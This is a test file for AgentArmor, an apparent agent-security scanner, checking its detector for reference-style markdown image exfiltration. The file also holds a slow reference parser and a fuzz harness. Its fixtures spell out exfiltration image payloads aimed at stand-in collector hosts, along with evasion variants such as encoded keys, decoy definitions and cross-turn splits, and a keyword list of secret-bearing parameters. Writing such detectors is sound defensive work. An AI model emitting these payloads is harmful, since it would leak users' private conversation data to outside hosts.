import { describe, it, expect } from 'vitest';
import { AgentArmor } from '../agent-armor';
import { MarkdownReferenceExfiltrationDetector } from '../detectors/behavioural-control/markdown-reference-exfiltration';

const detector = new MarkdownReferenceExfiltrationDetector();
const flags = (text: string) => detector.scan(text).threats.length > 0;

describe('reference-style markdown image exfiltration (#219)', () => {
  const DEF = '[r]: https://collector.example/p.png?data=PRIVATE';

  it('flags the definition after the image (the shape #220 covered)', () => {
    expect(flags(`Hello.\n\n![chart][r]\n\n${DEF}`)).toBe(true);
  });
  it('flags the definition before the image', () => {
    expect(flags(`${DEF}\n\nSummary text.\n\n![chart][r]`)).toBe(true);
  });
  it('flags collapsed and shortcut references', () => {
    expect(flags(`![r][]\n\n${DEF}`)).toBe(true);
    expect(flags(`![r]\n\n${DEF}`)).toBe(true);
  });
  it('flags a definition far from the image', () => {
    expect(flags(`![chart][r]\n\n${'filler text. '.repeat(2000)}\n\n${DEF}`)).toBe(true);
  });
  it('matches labels case-insensitively with collapsed whitespace', () => {
    expect(flags(`![x][My   Ref]\n\n[my ref]: https://c.example/p.png?token=1`)).toBe(true);
  });
  it('accepts <url>, a title after the url, and the url on the next line', () => {
    expect(flags(`![x][r]\n\n[r]: <https://c.example/p.png?secret=1>`)).toBe(true);
    expect(flags(`![x][r]\n\n[r]: https://c.example/p.png?secret=1 "title"`)).toBe(true);
    expect(flags(`![x][r]\n\n[r]:\n  https://c.example/p.png?secret=1`)).toBe(true);
  });
  it('reports every image that uses the definition, with its location', () => {
    const text = `![a][r] and ![b][r] and some words ![c][r]\n\n${DEF}`;
    const threats = detector.scan(text).threats;
    expect(threats.map((t) => text.slice(t.location!.offset, t.location!.offset + t.location!.length))).toEqual(['![a][r]', '![b][r]', '![c][r]']);
    expect(threats[0].category).toBe('behavioural-control');
    expect(threats[0].type).toBe('data-exfiltration');
  });
  it('reports images that touch each other as one finding, so a run of tiny images is one marker', () => {
    const text = `![a][r]![b][r] ![c][r]\n\n${DEF}`;
    const threats = detector.scan(text).threats;
    expect(threats.map((t) => text.slice(t.location!.offset, t.location!.offset + t.location!.length))).toEqual(['![a][r]![b][r] ![c][r]']);
    const dense = '![r]'.repeat(1000) + `\n\n${DEF}`;
    const result = AgentArmor.regexOnly().scanSync(dense);
    expect(result.sanitized.length).toBeLessThan(400);
  });
  it('accepts a scheme-relative URL', () => {
    expect(flags('![x][r]\n\n[r]: //c.example/p.png?data=1')).toBe(true);
  });
  it('follows CommonMark: nested brackets in the alt text', () => {
    expect(flags(`![a [b] c][r]\n\n${DEF}`)).toBe(true);
    expect(flags(`![a [b] c]\n\n[a [b] c]: https://c.example/p.png?data=1`)).toBe(false); // a shortcut label cannot hold brackets
  });
  it('follows CommonMark: line breaks inside the alt text or a label, but not across a blank line', () => {
    expect(flags(`![first\nsecond][r]\n\n${DEF}`)).toBe(true);
    expect(flags(`![x][my\nref]\n\n[my ref]: https://c.example/p.png?data=1`)).toBe(true);
    expect(flags(`![x][my ref]\n\n[my\nref]: https://c.example/p.png?data=1`)).toBe(true);
    expect(flags(`![my\nref]\n\n[my ref]: https://c.example/p.png?data=1`)).toBe(true);
    expect(flags(`![x][my\n\nref]\n\n[my ref]: https://c.example/p.png?data=1`)).toBe(false); // a blank line ends the paragraph
    expect(flags(`![first\n\nsecond][r]\n\n${DEF}`)).toBe(false);
  });
  it('follows CommonMark: escaped brackets in a label or alt text', () => {
    expect(flags('![x][a\\]b]\n\n[a\\]b]: https://c.example/p.png?data=1')).toBe(true);
    expect(flags(`![a\\]b][r]\n\n${DEF}`)).toBe(true);
  });
  it('treats a lone \\r as a line ending', () => {
    expect(flags('![x][r]\r\r[r]:\rhttps://c.example/p.png?data=1')).toBe(true);
    expect(flags('![x][r]\r\n\r\n[r]:\r\nhttps://c.example/p.png?data=1')).toBe(true);
  });
  it('reads the alt text more than one way, so a stray bracket cannot hide the image', () => {
    expect(flags(`![a \`[\` b][r]\n\n${DEF}`)).toBe(true); // a bracket in a code span
    expect(flags(`![see \`arr[0\` here][r]\n\n${DEF}`)).toBe(true); // an unpaired bracket
    expect(flags(`![a <http://q.example/[> b][r]\n\n${DEF}`)).toBe(true); // a bracket in an autolink
    expect(flags(`![see \`]\` here][r]\n\n${DEF}`)).toBe(true); // a `]` in a code span closes the paired reading early
    expect(flags(`![a ] b][r]\n\n${DEF}`)).toBe(true);
  });
  it('scans the raw text: fullwidth brackets and non-Latin letters in labels are just characters', () => {
    expect(flags(`![chart \uff3bfig 1][r]\n\n${DEF}`)).toBe(true);
    expect(flags('![a][\u0422oken]\n\n[\u0442oken]: https://c.example/p.png?data=1')).toBe(true); // Cyrillic T / t
    expect(flags(`![a\n\u00a0\nb][r]\n\n${DEF}`)).toBe(true); // a line of only NBSP is not blank
  });
  it('has no label length cap, and accepts list markers before a definition', () => {
    expect(flags(`![x][${'l'.repeat(1500)}]\n\n[${'l'.repeat(1500)}]: https://c.example/p.png?data=1`)).toBe(true);
    expect(flags('![x][r]\n\n- [r]: https://c.example/p.png?data=1')).toBe(true);
    expect(flags('![x][r]\n\n1. [r]: https://c.example/p.png?data=1')).toBe(true);
    expect(flags('![x][r]\n\n- > [r]: https://c.example/p.png?data=1')).toBe(true);
  });
  it('decodes the URL before looking for the keyword', () => {
    for (const url of ['https://c.example/p.png?%64ata=1', 'https://c.example/p.png?d&#97;ta=1', 'https://c.example/p&#63;data=1', 'https://c.example/p.png?\uff44\uff41\uff54\uff41=1', 'https://c.example/p.png?da\u200bta=1']) {
      expect(flags(`![x][r]\n\n[r]: ${url}`), url).toBe(true);
    }
    expect(flags('![x][r]\n\n[r]: <https://c.example/p.png?q=1 data=S>')).toBe(true); // a space inside <...>
    expect(flags('![x][r]\n\n[r]: https://c.example/p.png?v=%64')).toBe(false); // decodes to `d`, not a keyword
  });
  it('folds case the way CommonMark does', () => {
    expect(flags('![x][STRASSE]\n\n[stra\u00dfe]: https://c.example/p.png?data=1')).toBe(true);
    expect(flags('![x][Stra\u00dfe]\n\n[STRASSE]: https://c.example/p.png?data=1')).toBe(true);
    expect(flags('![x][strasse2]\n\n[stra\u00dfe]: https://c.example/p.png?data=1')).toBe(false); // a different label
  });
  it('the related span covers the destination, so a definition split across two turns is still caught', () => {
    const armor = AgentArmor.regexOnly();
    const sync = armor.scanSession([
      { role: 'document' as const, content: 'Summary.\n\n![chart][r]\n\n[r]:' },
      { role: 'document' as const, content: 'https://collector.example/p.png?data=PRIVATE' },
    ]);
    expect(sync.crossTurnThreats.some((t) => t.detectorId === 'markdown-reference-exfiltration')).toBe(true);
  });

  it('stays clean for honest references', () => {
    expect(flags('![logo][l]\n\n[l]: https://cdn.example.com/logo.png?v=3')).toBe(false);
    expect(flags('![x][r]\n\n[r]: https://example.com/changelog?lang=en')).toBe(false);
    expect(flags('![x][r]\n\n[r]: https://example.com/data/chart.png')).toBe(false); // keyword in the path, no query
    expect(flags('![x][missing]\n\n[r]: https://c.example/p.png?data=1')).toBe(false); // no matching definition
    expect(flags('See the [report][r] for details.\n\n[r]: https://c.example/p.png?data=1')).toBe(false); // a link, not an image
    expect(flags('![x](https://example.com/a.png)\n\n[r]: https://c.example/p.png?data=1')).toBe(false); // inline image
  });
  it('flags a label if ANY definition of it sends data out, so a decoy cannot hide the real one', () => {
    const real = '[r]: https://evil.example/p.png?data=S';
    expect(flags(`![x][r]\n\n[r]: https://ok.example/a.png\n${real}`)).toBe(true);
    expect(flags('![x][r]\n\n```\n[r]: https://ok.example/a.png\n```\n' + real)).toBe(true);
    expect(flags('![x][r]\n\nNotes\n[r]: https://ok.example/a.png\n\n' + real)).toBe(true);
    expect(flags('![x][r]\n\n<!--\n[r]: https://ok.example/a.png\n-->\n' + real)).toBe(true);
    expect(flags('![x][r]\n\n[r]: https://ok.example/a.png "unterminated\n' + real)).toBe(true);
  });
  it('sees definitions in block quotes and list items, with tabs', () => {
    expect(flags('![x][r]\n\n> [r]: https://c.example/p.png?data=1')).toBe(true);
    expect(flags('![x][r]\n\n- item\n\n\t[r]: https://c.example/p.png?data=1')).toBe(true);
    expect(flags('![x][r]\n\n10. item\n\n    [r]: https://c.example/p.png?data=1')).toBe(true);
  });
  it('has no length caps to pad past: long path, long query, long alt text, long url', () => {
    expect(flags(`![x][r]\n\n[r]: https://c.example/${'a'.repeat(3000)}.png?data=1`)).toBe(true);
    expect(flags(`![x][r]\n\n[r]: https://c.example/p.png?a=${'b'.repeat(3000)}&data=1`)).toBe(true);
    expect(flags(`![${'alt '.repeat(900)}][r]\n\n[r]: https://c.example/p.png?data=1`)).toBe(true);
  });
  it('a finding carries the definition as a related span, used by cross-turn scanning but not by sanitization', () => {
    const text = `![x][r]\n\n${DEF}`;
    const t = detector.scan(text).threats[0];
    expect(text.slice(t.relatedLocation!.offset, t.relatedLocation!.offset + 4)).toBe('[r]:');
    expect(t.location!.length).toBe('![x][r]'.length);
  });
  it('catches an image in one turn and its definition in the next', async () => {
    const armor = AgentArmor.regexOnly();
    const turns = [
      { role: 'document' as const, content: 'Summary of the quarter.\n\n![chart][r]' },
      { role: 'document' as const, content: `Appendix.\n\n${DEF}` },
    ];
    const sync = armor.scanSession(turns);
    expect(sync.crossTurnThreats.some((t) => t.detectorId === 'markdown-reference-exfiltration')).toBe(true);
    const async = await armor.scanSessionAsync(turns);
    expect(async.crossTurnThreats.some((t) => t.detectorId === 'markdown-reference-exfiltration')).toBe(true);
  });

  it('is wired into a scan and its image is replaced', () => {
    const armor = AgentArmor.regexOnly();
    const text = `Hi.\n\n![chart][r]\n\n${DEF}`;
    const result = armor.scanSync(text);
    expect(result.clean).toBe(false);
    expect(result.threats.some((t) => t.detectorId === 'markdown-reference-exfiltration')).toBe(true);
    expect(result.sanitized).not.toContain('![chart][r]');
    expect(result.sanitized).toContain('[BLOCKED: exfiltration instruction removed by AgentArmor]');
  });
  it('is switched off with exfiltrationURLs: false', () => {
    const armor = AgentArmor.regexOnly({ behaviouralControl: { exfiltrationURLs: false } });
    expect(armor.scanSync(`![chart][r]\n\n${DEF}`).clean).toBe(true);
  });
});

/**
 * Slow, independent reading of the same rules, to fuzz the scan against. It
 * parses forward from every candidate start instead of pairing brackets in one
 * pass, so a mistake in one is unlikely to be repeated in the other.
 */
function reference(content: string): Array<[number, number]> {
  const n = content.length;
  const KEYWORDS = ['data', 'token', 'secret', 'key', 'context', 'conversation', 'history', 'session', 'password', 'credential', 'api_key', 'api-key', 'apikey', 'env'];
  const isBreakChar = (c: string | undefined) => c === '\n' || c === '\r';
  const isWs = (c: string) => /\s/.test(c);
  const norm = (s: string) => s.trim().replace(/\s+/g, ' ').toLowerCase().toUpperCase().toLowerCase();
  const afterBreak = (i: number) => (content[i] === '\r' && content[i + 1] === '\n' ? i + 2 : isBreakChar(content[i]) ? i + 1 : i);
  const blankLineAt = (i: number) => {
    let k = i;
    while (content[k] === ' ' || content[k] === '\t') k++;
    return k >= n || isBreakChar(content[k]);
  };
  const decode = (url: string): string => {
    let u = url.normalize('NFKC');
    u = Array.from(u).filter((ch) => !'­​‌‍⁠﻿'.includes(ch)).join('');
    u = u.replace(/&#(\d{1,7});/g, (m, d) => { const cp = Number(d); return cp > 0 && cp <= 0x10ffff ? String.fromCodePoint(cp) : m; });
    u = u.replace(/&#[xX]([0-9a-fA-F]{1,6});/g, (m, h) => { const cp = parseInt(h, 16); return cp > 0 && cp <= 0x10ffff ? String.fromCodePoint(cp) : m; });
    u = u.replace(/&(amp|lt|gt|quot|apos);/g, (_m, name) => ({ amp: '&', lt: '<', gt: '>', quot: '"', apos: "'" } as Record<string, string>)[name]);
    u = u.replace(/%([2-7][0-9A-Fa-f])/g, (m, h) => { const c = String.fromCharCode(parseInt(h, 16)); return /[A-Za-z0-9_-]/.test(c) ? c : m; });
    return u;
  };
  const flaggedUrl = (raw: string): boolean => {
    const angle = raw.startsWith('<');
    let u = decode(raw);
    if (angle) u = u.slice(1);
    const m = /^(?:https?:)?\/\//i.exec(u);
    if (!m) return false;
    u = u.slice(m[0].length);
    const stops = (ch: string) => (angle ? ch === '>' : isWs(ch) || ch === '>');
    let q = -1;
    for (let i = 0; i < u.length; i++) {
      if (stops(u[i])) return false;
      if (u[i] === '?') { q = i; break; }
    }
    if (q < 0) return false;
    const query = u.slice(q + 1);
    for (let start = 0; start < query.length; start++) {
      if (stops(query[start])) return false;
      for (const k of KEYWORDS) {
        if (query.slice(start, start + k.length).toLowerCase() !== k) continue;
        const nxt = query[start + k.length];
        if (nxt === undefined || !/[A-Za-z0-9_]/.test(nxt)) return true;
      }
    }
    return false;
  };

  /** A bracketed label whose `[` is at `open`: no unescaped brackets, escapes, line breaks but no blank line. Returns the `]` index or -1. */
  const labelEnd = (open: number, allowEmpty = false): number => {
    let i = open + 1;
    let items = 0;
    while (i < n) {
      const c = content[i];
      if (c === ']') return items >= 1 || allowEmpty ? i : -1;
      if (c === '[') return -1;
      if (c === '\\') { if (i + 1 >= n) return -1; i += 2; items++; continue; }
      if (isBreakChar(c)) {
        const next = afterBreak(i);
        if (blankLineAt(next)) return -1;
        i = next; items++; continue;
      }
      i++; items++;
    }
    return -1;
  };

  const flagged = new Set<string>();
  for (let i = 0; i <= n; i++) {
    const lineStart = i === 0 || content[i - 1] === '\n' || content[i - 1] === '\r' || content[i - 1] === ' ' || content[i - 1] === ' ';
    if (!lineStart) continue;
    let p = i;
    for (;;) {
      const c = content[p];
      if (c === ' ' || c === '\t' || c === '>') { p++; continue; }
      if ((c === '-' || c === '*' || c === '+') && (content[p + 1] === ' ' || content[p + 1] === '\t')) { p++; continue; }
      let d = p;
      while (d < n && d - p < 9 && content[d] >= '0' && content[d] <= '9') d++;
      if (d > p && (content[d] === '.' || content[d] === ')') && (content[d + 1] === ' ' || content[d + 1] === '\t')) { p = d + 1; continue; }
      break;
    }
    if (content[p] !== '[') continue;
    const e = labelEnd(p);
    if (e < 0 || content[e + 1] !== ':') continue;
    let d = e + 2;
    while (content[d] === ' ' || content[d] === '\t') d++;
    if (isBreakChar(content[d])) { d = afterBreak(d); while (content[d] === ' ' || content[d] === '\t' || content[d] === '>') d++; }
    let dest = '';
    if (content[d] === '<') {
      let g = d + 1;
      while (g < n && content[g] !== '>' && !isBreakChar(content[g])) g++;
      if (content[g] !== '>' || g - (d + 1) < 1) continue;
      dest = content.slice(d, g + 1);
    } else {
      if (d >= n || isWs(content[d])) continue;
      let g = d;
      while (g < n && !isWs(content[g])) g++;
      dest = content.slice(d, g);
    }
    if (flaggedUrl(dest)) flagged.add(norm(content.slice(p + 1, e)));
  }

  /** Reading A: the `[` at `open` paired with its `]` by nesting; blank lines end the search. */
  const nestedEnd = (open: number): { end: number; inner: boolean } | undefined => {
    let depth = 0;
    let inner = false;
    for (let i = open; i < n; ) {
      const c = content[i];
      if (c === '\\') { i += 2; continue; }
      if (c === '[') { depth++; if (depth > 1) inner = true; }
      else if (c === ']') { depth--; if (depth === 0) return { end: i, inner }; }
      else if (isBreakChar(c)) {
        const next = afterBreak(i);
        if (blankLineAt(next)) return undefined;
        i = next;
        continue;
      }
      i++;
    }
    return undefined;
  };
  /** Reading B: the first unescaped `]` after the `[` at `open`, before a blank line. */
  const firstEnd = (open: number): { end: number; inner: boolean } | undefined => {
    let inner = false;
    for (let i = open + 1; i < n; ) {
      const c = content[i];
      if (c === '\\') { i += 2; continue; }
      if (c === '[') inner = true;
      else if (c === ']') return { end: i, inner };
      else if (isBreakChar(c)) {
        const next = afterBreak(i);
        if (blankLineAt(next)) return undefined;
        i = next;
        continue;
      }
      i++;
    }
    return undefined;
  };

  const hits: Array<[number, number]> = []; // [start, end)
  const readImage = (at: number, alt: { end: number; inner: boolean }) => {
    const afterAlt = alt.end + 1;
    let end = afterAlt;
    let label: string | undefined;
    if (content[afterAlt] === '[') {
      const le = labelEnd(afterAlt, true);
      if (le >= 0) {
        end = le + 1;
        const explicit = content.slice(afterAlt + 1, le);
        if (explicit.trim() !== '') label = explicit;
        else if (!alt.inner) label = content.slice(at + 2, alt.end);
      }
    } else if (content[afterAlt] === '(') return;
    if (label === undefined && end === afterAlt && !alt.inner) label = content.slice(at + 2, alt.end);
    const key = label === undefined ? '' : norm(label);
    if (key !== '' && flagged.has(key)) hits.push([at, end]);
  };
  for (let i = 0; i < n - 1; i++) {
    if (!(content[i] === '!' && content[i + 1] === '[')) continue;
    const a = nestedEnd(i + 1);
    const b = firstEnd(i + 1);
    if (a) readImage(i, a);
    if (b && !(a && a.end === b.end)) readImage(i, b);
  }
  // Reading C: any `][label]` after a `![` in the same paragraph is an image to that label.
  let lastBang = -1;
  for (let i = 0; i < n; ) {
    const c = content[i];
    if (c === '\\') { i += 2; continue; }
    if (c === '[' && i > 0 && content[i - 1] === '!') lastBang = i - 1;
    if (c === ']' && lastBang >= 0 && content[i + 1] === '[') {
      const le = labelEnd(i + 1);
      if (le >= 0) {
        const key = norm(content.slice(i + 2, le));
        if (key !== '' && flagged.has(key)) hits.push([lastBang, le + 1]);
      }
    }
    if (isBreakChar(c)) {
      const next = afterBreak(i);
      if (blankLineAt(next)) lastBang = -1;
      i = next;
      continue;
    }
    i++;
  }
  hits.sort((x, y) => x[0] - y[0] || y[1] - x[1]);
  const out: Array<[number, number]> = [];
  for (const [s, e] of hits) {
    const last = out[out.length - 1];
    const lastEnd = last ? last[0] + last[1] : 0;
    if (last && (s < lastEnd || (s - lastEnd <= 100 && /^\s*$/.test(content.slice(lastEnd, s))))) {
      last[1] = Math.max(lastEnd, e) - last[0];
    } else {
      out.push([s, e - s]);
    }
  }
  return out;
}

function rng(seed: number) {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

describe('matches a slow reference on generated documents (#219)', () => {
  const LABELS = ['r', 'R', 'my ref', 'My   Ref', ' r ', 'x', 'Stra\u00dfe', 'STRASSE', 'a\\]b', 'my\nref', 'my\r\nref', 'my\rref', 'a\n\nb'];
  const URLS = [
    'https://c.example/p.png?data=X', 'http://c.example/?token=1', 'https://c.example/p.png?v=3', 'https://c.example/data/p.png',
    '<https://c.example/p.png?secret=1>', 'https://c.example/?q=1&key=2', 'https://c.example/p.png?monkey=1', 'https://c.example/p.png?api_key=1',
    'ftp://c.example/?data=1', 'https://c.example/p.png?', 'https://c.example/p.png?env', '<https://c.example/p.png?data=1',
    'https://c.example/' + 'p'.repeat(300) + '.png?a=' + 'q'.repeat(300) + '&data=1', 'https://ok.example/a.png',
  ];
  const NOISE = ['text ', ' ', '\n', '\n\n', '\r\n', '\r', '\t', '(', ')', '[', ']', '[b]', '\\]', '\\[', '!', ':', '<', '>', '?', 'a', '\u2028', 'x'.repeat(40)];
  const label = (rand: () => number) => LABELS[Math.floor(rand() * LABELS.length)];
  const pick = <T,>(rand: () => number, xs: T[]) => xs[Math.floor(rand() * xs.length)];
  const piece = (rand: () => number): string => {
    const r = rand();
    if (r < 0.3) {
      const form = rand();
      const l = label(rand);
      if (form < 0.05) return `![${'alt '.repeat(300)}][${l}]`;
      if (form < 0.12) return pick(rand, ['![a [b] c]', '![a\\]b]', '![first\nsecond]', '![first\r\nsecond]', '![a [b c]', '![[b]]', '![a `[` b]', '![a `]` b]', '![a <http://q.example/[> b]', '![a ] b]']) + `[${l}]`;
      if (form < 0.16) return pick(rand, ['![a [b] c]', '![first\nsecond]', '![a\\]b]']);
      if (form < 0.4) return `![alt][${l}]`;
      if (form < 0.6) return `![${l}][]`;
      if (form < 0.8) return `![${l}]`;
      if (form < 0.9) return '![alt](https://c.example/a.png)';
      return `![alt][${l}`;
    }
    if (r < 0.62) {
      const indent = pick(rand, ['', ' ', '   ', '    ', '\t', '> ', '>> ', '- ', '1. ', '10) ', '- > ', '* ']);
      const sep = pick(rand, [' ', '', '\t', '\n  ', '\n\n']);
      const title = rand() < 0.2 ? ' "title"' : '';
      return `\n${indent}[${label(rand)}]:${sep}${pick(rand, URLS)}${title}\n`;
    }
    return pick(rand, NOISE);
  };
  it(`agrees on ${process.env.FUZZ_CASES ?? 30_000} structured inputs and finds real matches`, () => {
    const cases = Number(process.env.FUZZ_CASES ?? 30_000);
    const rand = rng(Number(process.env.FUZZ_SEED ?? 219));
    let withMatch = 0;
    for (let n = 0; n < cases; n++) {
      let text = '';
      for (let k = 1 + Math.floor(rand() * 10); k > 0; k--) text += piece(rand);
      for (let m = Math.floor(rand() * 3); m > 0 && text.length > 0; m--) {
        const at = Math.floor(rand() * text.length);
        const op = rand();
        text = op < 0.4 ? text.slice(0, at) + text.slice(at + 1) : op < 0.8 ? text.slice(0, at) + pick(rand, NOISE) + text.slice(at) : text.slice(0, at) + text.slice(at + 1 + Math.floor(rand() * 5));
      }
      const actual = detector.scan(text).threats.map((t) => [t.location!.offset, t.location!.length]);
      const expected = reference(text);
      if (expected.length > 0) withMatch++;
      if (JSON.stringify(actual) !== JSON.stringify(expected)) {
        expect.fail(`case ${n}\ninput: ${JSON.stringify(text).replace(/[\u2028\u2029]/g, (c) => '\\u' + c.charCodeAt(0).toString(16))}\nexpected: ${JSON.stringify(expected)}\nactual: ${JSON.stringify(actual)}`);
      }
    }
    // A fuzz that never produces a match proves nothing.
    expect(withMatch / cases).toBeGreaterThan(0.1);
  }, 180_000);
});

describe('stays linear (#219)', () => {
  const shapes: Array<[string, string]> = [
    ['dense images, one flagged definition', '![a][b]'.repeat(40) + '\n[b]: https://x.example/?data=1\n'],
    ['dense images, no definition', '![a][b]'],
    ['many flagged definitions', '[b]: https://x.example/?data=1\n'],
    ['definitions with long labels', '[' + 'l'.repeat(199) + ']: https://x.example/?data=1\n'],
    ['unterminated brackets', '![' + 'a'.repeat(199)],
    ['bare image openers', '!['],
    ['question marks in a url', '![][b]'.repeat(50) + '\n[b]: http://' + '?'.repeat(199) + ' '],
    ['same label many times', '![a][b]\n[b]: https://x.example/?data=1\n'],
    ['decoy definitions then one real one', '[b]: https://ok.example/a.png\n'],
    ['long url without a keyword', '[b]: https://x.example/' + 'p'.repeat(1900) + '?v=1\n'],
    ['long indent before a bracket', ' '.repeat(1000) + '[\n'],
    ['block quote markers', '> > > > > > [b]: https://x.example/?data=1\n'],
    ['image openers over one far bracket', '![![![![![![![![![![x]'],
    ['nested open brackets', '[[[[[[[[[[[[[[[['],
    ['image openers with nested brackets', '![[![[![[!['],
    ['backslash runs', '\\\\\\\\\\[x\\\\\\\\\\]'],
    ['long label split by line breaks', '[' + 'word\n'.repeat(150) + ']: https://x.example/?data=1\n'],
    ['alt text spanning many lines', '![' + 'line\n'.repeat(150) + '][b]\n'],
    ['blank lines between brackets', '![a\n\n][b\n\n]\n'],
  ];
  it.each(shapes)('1,000,000 characters of %s scan in well under a second', (_name, unit) => {
    const text = unit.repeat(Math.ceil(1_000_000 / unit.length));
    const start = performance.now();
    detector.scan(text);
    expect(performance.now() - start).toBeLessThan(400);
  });
});
